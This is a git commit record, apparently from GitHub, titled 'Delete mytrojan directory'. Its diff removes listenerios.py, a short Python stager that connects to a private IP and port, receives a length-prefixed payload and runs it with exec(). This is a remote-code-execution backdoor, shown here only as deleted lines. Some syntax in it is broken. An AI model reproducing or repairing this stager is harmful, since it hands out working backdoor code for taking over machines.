5bfc762f5893b00938d489ddfc430a78564bdbbd
Mzgin L Ghazi <158284454+mzgindosky96@users.noreply.github.com>
2025-05-21 21:55:55 +0300

    Delete mytrojan directory

--- mytrojan/listenerios.py
+++
@@ -1,8 +0,0 @@
-import socket,struct
-s = socket.socket(2,1)
-s.connect('192.168.119.128 ',5574)
-l = struct.unpack('>I', s.recv(4))[0]
-d = s.recv(4096)
-while len(d) != l:
-    d += s.recv(4096)
-exec(d,{'s':s})"
